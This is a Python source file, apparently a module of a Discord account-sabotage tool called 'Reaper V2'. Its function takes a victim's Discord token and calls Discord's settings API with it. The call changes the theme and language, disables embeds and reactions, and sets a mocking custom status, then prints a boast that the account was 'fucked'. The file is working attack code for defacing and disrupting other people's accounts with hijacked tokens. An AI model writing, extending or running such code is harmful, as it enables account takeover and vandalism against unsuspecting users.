import random
import requests
from utils.common import *

def fuckAccount(token):
        set_console_title("Reaper V2  | Made by realecstacy. | Fuck Account")
        setting = {
            'theme': 'light',
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
            'custom_status':{
                'text': 'Fucked By Reapers.xyz',
                'emoji_name': '⏱️'
            },
            'render_embeds': False,
            'render_reactions': False
        }
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
        print(f"{Fore.WHITE}[ {Fore.LIGHTCYAN_EX}C {Fore.WHITE}] Fucked his Account")
        time.sleep(2)
